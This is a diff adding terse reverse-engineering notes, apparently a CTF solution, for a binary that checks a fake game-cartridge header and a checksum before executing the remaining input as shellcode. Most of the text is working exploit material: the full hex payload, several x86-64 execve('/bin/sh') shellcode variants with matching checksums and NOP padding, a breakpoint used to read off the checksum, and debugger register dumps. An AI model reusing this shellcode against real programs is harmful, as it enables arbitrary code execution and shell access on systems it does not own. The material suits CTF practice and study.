@@ -1,0 +1,86 @@
+program checks for correct "header" by checking for presence of "NIIv0.1:TwltPrnc" or some other fake game cartridge. The next 4 bytes are a checksum of the rest of your input, which then gets run as direct shellcode.
+
+breaking on the cmp at 0x40118b gives us the correct checksum, lol
+
+shellcode: https://www.exploit-db.com/exploits/42126
+
+final input (remove spaces): 4E494976302E313A54776C7450726E63 ABFC334D EB104831C05F4831F64831D24883C03B0F05E8EBFFFFFF2F62696E2F2F7368
+
+0x3a 31 2e 30 76 49 49 4e
+
+4E494976302E313A
+
+ex: 67 6e 69 58 6c 6e 6d 41
+
+twltprnc: 54776C7450726E63
+
+anmlxing: 416D6E6C58696E67
+
+marocart: 4D61726F43617274
+
+take hex char ('1')
+
+4E494976302E313A54776C7450726E63
+B443D2D4
+90909090
+9090909090909090
+# shellcode 1
+D4D243B4
+4831F6590909090648BF2F62696E2F2F736857545FB03B990F05
+# shellcode 2
+C5B1D654
+504831D24831F648BB2F62696E2F2F736853545FB03B0F05
+# shellcode 3
+ABFC334D
+EB104831C05F4831F64831D24883C03B0F05E8EBFFFFFF2F62696E2F2F7368
+
+
+B443D2D4
+
+0x401127
+
+edx: 0x22221111 with input 11112222
+
+ 0x40115a some loop
+
+  0x401180    cmp    r8w, word ptr [0x402062]
+   0x401189    jl     0x401156
+    x/xw 0x402062
+0x402062:       0x494e0010
+
+
+*RAX  0x180000011
+*RBX  0x36
+*RCX  0xff
+*RDX  0xaaaaaaaa
+*RDI  0x36
+*RSI  0x402078 ◂— xor    eax, 0x36393638 /* 0x3936383543364536 */
+*R8   0x14
+ R9   0x0
+*R10  0x0
+ R11  0x246
+ R12  0x0
+ R13  0x0
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffe2d0 ◂— 0x1
+ RSP  0x7fffffffe2d0 ◂— 0x1
+*RIP  0x40117a ◂— inc    rsi
+
+*RAX  0x180000011
+*RBX  0x36
+*RCX  0xff
+*RDX  0xbbbbbbbb
+*RDI  0x36
+*RSI  0x402078 ◂— xor    eax, 0x36393638 /* 0x3936383543364536 */
+*R8   0x14
+ R9   0x0
+*R10  0x0
+ R11  0x246
+ R12  0x0
+ R13  0x0
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffe2d0 ◂— 0x1
+ RSP  0x7fffffffe2d0 ◂— 0x1
+*RIP  0x40117a ◂— inc    rsi
